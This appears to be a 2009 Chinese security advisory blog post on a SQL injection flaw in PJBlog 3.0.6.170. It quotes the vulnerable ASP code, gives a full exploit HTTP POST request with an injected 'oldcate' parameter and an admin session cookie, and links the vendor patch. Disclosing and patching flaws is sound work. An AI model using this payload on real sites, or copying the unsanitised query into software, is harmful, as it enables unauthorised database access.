---
title: PJBlog 3.0.6.170 cls_logAction.asp SQL注入漏洞
description: PJBlog3.0.6.170cls_logAction.aspSQL注入漏洞影响版本:PJBlog3.0.6.170程序介绍:PJBlog是一套开源免费的中文个人博客系统程序，采用asp+Access的技术，具有相当高的运作效能以及更新率，也支持目前Blog所使用的新技术。漏洞分析:在文件class/cls_logAction.asp中：……
date: 2009-05-10 09:42:15
category: 漏洞信息
tags: ['PJblog', '注入', '漏洞信息']
post_id: 861
alias: PJBlog-3.0.6.170-cls_logAction.asp-SQLInjection
ViewNums: 2976
---

[PJBlog 3.0.6.170 cls_logAction.asp SQL注入漏洞](/blog/pjblog-306170-cls_logactionasp-sqlinjection)

影响版本:[PJBlog 3.0.6.170](/blog/pjblog-306170-cls_logactionasp-sqlinjection)

**程序介绍:**
[PJBlog](/tags/PJblog)是一套开源免费的中文个人博客系统程序，采用asp+Access的技术，具有相当高的运作效能以及更新率，也支持目前[Blog](/blog/)所使用的新技术。

**漏洞分析:**
在文件[class/cls_logAction.asp](/blog/pjblog-306170-cls_logactionasp-sqlinjection)中：

oldcate=request.form("oldcate")  //第429行
oldctype=request.form("oldtype")

D = conn.execute("select cate_Part from blog_Category where  cate_ID="&oldcate)(0)

程序没有对变量oldcate做任何过滤放入sql查询语句中，导致[注入漏洞](/tags/%E6%B3%A8%E5%85%A5)的产生。

**漏洞利用:**

POST /blogedit.asp HTTP/1.1
Accept: application/x-shockwave-flash,  image/gif, image/x-xbitmap,
image/jpeg, image/pjpeg, application/msword,  application/vnd.ms-excel,
application/vnd.ms-powerpoint, */*
Referer: http://127.0.0.1/blogedit.asp?id=1
Accept-Language:  zh-cn
Content-Type: application/x-www-form-urlencoded
UA-CPU:  x86
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible;  MSIE 7.0; Windows NT 5.1;
TencentTraveler 4.0; .NET CLR 2.0.50727)
Host:  127.0.0.1
Content-Length: 513
Connection: Keep-Alive
Cache-Control:  no-cache
Cookie:  __utma=96992031.4542583209449947600.1239335726.
1240296350.1240324232.7;  __utmz=96992031.1239335726.1.1.utmcsr=
(direct)|utmccn=(direct)|utmcmd=(none);  PJBlog3Setting=ViewType=normal;
PJBlog3=memRight=111111111111&memHashKey=
c80f369e20b317566f736dbc70839834745d9c20&memName=admin&exp=
2010%2D4%2D21;  ASPSESSIONIDCCDSDABA=OEBBHCODJFKIJEGKGCPHGMCP

id=1&log_editType=1&action=post&log_IsDraft=False&title=xxx&log_CateID=
3&cname=xxx&ctype=0&oldcname=xxx&oldtype=0&oldcate=3201=1&log_weather=
sunny&log_Status=level3&log_comorder=1&blog_pws=0&log_Readpw=
&log_Pwtips=&c_pws=0&blog_Meta=0&evio_KeyWords=xxx&evio_Description=
web+safe&log_From=%E6%9C%AC%E7%AB%99%E5%8E%9F%E5%88%9B&
log_FromURL=http%3A%2F%2Flocalhost%2Fbackci%2F&PubTimeType=
com&PubTime=2009-4-21+15%3A54%3A46&tags=&UBBfonts=&UBBfonts=
&UBBfonts=&UBBmethod=on&Message=web+safe&log_Intro=web+safe&log_Quote=

**解决方案:**
厂商补丁：
[PJblog](/tags/PJblog)
-------
目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
<http://bbs.pjhome.net/thread-52214-1-1.html>

**信息来源:**
<*来源: Bug.Center.Team [http://www.cnbct.org](http://www.cnbct.org/)
链接: <http://wavdb.com/vuln/1410> *>

相关：
[PJBlog 3.0.6.170 Getarticle.asp页面跨站脚本攻击XSS漏洞](/blog/pjblog-306170-getarticleasp-xss)
[PJBlog 3.0.6.170 Action.asp页面跨站脚本攻击漏洞](/blog/pjblog-306170-actionasp-xss)
[PJblog V3.0 0day Vbs版漏洞利用工具exploit](/blog/pjblog-v30-0day-vbs-exploit)

